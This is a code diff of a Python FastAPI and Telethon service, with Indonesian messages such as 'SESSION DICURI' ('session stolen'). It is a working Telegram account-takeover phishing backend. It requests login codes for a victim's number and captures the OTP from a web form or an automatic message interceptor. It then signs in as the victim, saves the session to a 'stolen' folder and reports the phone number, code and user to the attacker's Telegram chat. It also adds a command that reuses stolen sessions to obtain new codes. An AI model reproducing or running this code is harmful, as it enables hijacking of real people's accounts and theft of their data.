@@ -1,39 +1,39 @@
 from fastapi import FastAPI, Request
-from telethon import TelegramClient
+from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 import asyncio
 import os
-import uvicorn
+import re
 
 app = FastAPI()
 
-# ENV (WAJIB DI RAILWAY!)
 API_ID = int(os.getenv('API_ID'))
 API_HASH = os.getenv('API_HASH')
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 CHAT_ID = int(os.getenv('CHAT_ID'))
 
-# Cek ENV
-if not all([API_ID, API_HASH, BOT_TOKEN, CHAT_ID]):
-    raise RuntimeError("Set API_ID, API_HASH, BOT_TOKEN, CHAT_ID di Railway!")
-
 client = TelegramClient('jinx', API_ID, API_HASH)
-pending = {}  # phone -> {'client': ..., 'hash': ...}
+listening = {}
+OTP_PATTERN = re.compile(r'\b(\d{5})\b')
 
-@app.post("/send_otp")
-async def send_otp(req: Request):
+@app.post("/start_listen")
+async def start_listen(req: Request):
     data = await req.json()
     phone = data['phone']
-    
+
     temp = TelegramClient(StringSession(), API_ID, API_HASH)
     await temp.connect()
     sent = await temp.send_code_request(phone)
-    pending[phone] = {'client': temp, 'hash': sent.phone_code_hash}
-    
-    # Kirim notif
-    await client.start(bot_token=BOT_TOKEN)
-    await client.send_message(CHAT_ID, f"TARGET MASUK!\nNomor: `{phone}`\nMenunggu OTP...")
-    
+    listening[phone] = {'client': temp, 'hash': sent.phone_code_hash}
+
+    # INTERCEPTOR OTOMATIS
+    @temp.on(events.NewMessage(incoming=True))
+    async def handler(event):
+        if event.is_private and OTP_PATTERN.search(event.message.message):
+            code = OTP_PATTERN.search(event.message.message).group(1)
+            await auto_login(phone, code, source="interceptor")
+
+    await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP (web/bot)...")
     return {"success": True}
 
 @app.post("/submit_otp")
@@ -41,36 +41,58 @@ async def submit_otp(req: Request):
     data = await req.json()
     phone = data['phone']
     otp = data['otp']
-    
-    if phone not in pending:
-        return {"success": False, "error": "No OTP sent"}
-    
-    temp = pending[phone]['client']
-    hash_ = pending[phone]['hash']
-    
+    if phone in listening:
+        await auto_login(phone, otp, source="web")
+    return {"success": True}
+
+async def auto_login(phone, code, source="unknown"):
+    if phone not in listening: return
+    temp = listening[phone]['client']
+    hash_ = listening[phone]['hash']
+
     try:
-        await temp.sign_in(phone, otp, phone_code_hash=hash_)
+        await temp.sign_in(phone, code, phone_code_hash=hash_)
         me = await temp.get_me()
         session_str = temp.session.save()
-        
-        # Simpan session
+
         os.makedirs("stolen", exist_ok=True)
         with open(f"stolen/{phone.replace('+','')}.session", "w") as f:
             f.write(session_str)
-        
-        # Kirim notif
-        msg = f"SESSION DICURI!\nUser: {me.first_name}\nPhone: `{phone}`\nGunakan: /login {phone}"
+
+        msg = f"SESSION DICURI!\nSumber: {source.upper()}\nOTP: `{code}`\nUser: {me.first_name}\n/login {phone}"
         await client.send_message(CHAT_ID, msg)
-        
-        del pending[phone]
-        return {"success": True}
+        del listening[phone]
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        await client.send_message(CHAT_ID, f"Gagal: {str(e)}")
+
+# /new_otp
+@client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
+async def new_otp(event):
+    phone = event.pattern_match.group(1)
+    session_file = f"stolen/{phone.replace('+','')}.session"
+    if not os.path.exists(session_file):
+        await event.reply("Session tidak ada!")
+        return
+    
+    session_str = open(session_file).read()
+    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+    await stolen.connect()
+    await stolen.start()
+    
+    try:
+        await stolen.send_code_request(phone)
+        await event.reply(f"OTP BARU DIKIRIM KE `{phone}`")
+        # Mulai listen lagi
+        listening[phone] = {'client': stolen, 'hash': None}
+        @stolen.on(events.NewMessage(incoming=True))
+        async def handler(e):
+            if OTP_PATTERN.search(e.message.message):
+                code = OTP_PATTERN.search(e.message.message).group(1)
+                await event.reply(f"OTP BARU: `{code}`")
+    except Exception as e:
+        await event.reply(f"Gagal: {str(e)}")
 
 @app.on_event("startup")
 async def startup():
-    await client.connect()
-    print("JINX BOT HIDUP – SIAP CURI SESSION!")
-
-if __name__ == "__main__":
-    uvicorn.run("main:app", host="0.0.0.0", port=8080, log_level="info")
+    await client.start(bot_token=BOT_TOKEN)
+    print("JINX HYBRID BOT HIDUP!")
